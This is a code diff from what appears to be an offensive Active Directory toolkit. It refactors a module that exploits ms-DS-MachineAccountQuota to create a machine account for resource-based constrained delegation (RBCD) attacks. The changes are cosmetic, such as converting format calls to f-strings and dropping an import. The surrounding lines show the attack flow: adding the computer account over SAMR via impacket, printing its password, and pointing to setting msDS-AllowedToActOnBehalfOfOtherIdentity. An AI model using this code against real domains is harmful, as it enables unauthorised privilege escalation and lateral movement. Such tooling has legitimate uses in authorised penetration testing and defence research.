@@ -1,5 +1,4 @@
-"""Add machine account — exploit ms-DS-MachineAccountQuota for RBCD."""
-from __future__ import annotations
+"""Add machine account  -  exploit ms-DS-MachineAccountQuota for RBCD."""
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -23,7 +22,7 @@ def run(args: Any) -> int:
     if not computer_name.endswith("$"):
         computer_name += "$"
 
-    print("[*] Adding machine account: {} on {}".format(computer_name, dc_ip))
+    print(f"[*] Adding machine account: {computer_name} on {dc_ip}")
 
     try:
         from impacket.examples.addcomputer import AddComputerSAMR
@@ -72,9 +71,9 @@ def run(args: Any) -> int:
             USER_INFORMATION_CLASS, SamrSetInformationUser2
         import hashlib
 
-        encoded_pw = '"{}"'.format(computer_pass).encode("utf-16-le")
-        print("[+] Machine account {} created (RID: {})".format(computer_name, user_rid))
-        print("[+] Password: {}".format(computer_pass))
+        encoded_pw = f'"{computer_pass}"'.encode("utf-16-le")
+        print(f"[+] Machine account {computer_name} created (RID: {user_rid})")
+        print(f"[+] Password: {computer_pass}")
         print("[*] Use for RBCD: set msDS-AllowedToActOnBehalfOfOtherIdentity")
 
         dce.disconnect()
@@ -85,5 +84,5 @@ def run(args: Any) -> int:
         if "STATUS_DS_MACHINE_ACCOUNT_QUOTA_EXCEEDED" in error_str:
             print("[-] MachineAccountQuota exceeded (default 10)")
         else:
-            print("[-] Add computer error: {}".format(exc))
+            print(f"[-] Add computer error: {exc}")
         return 1
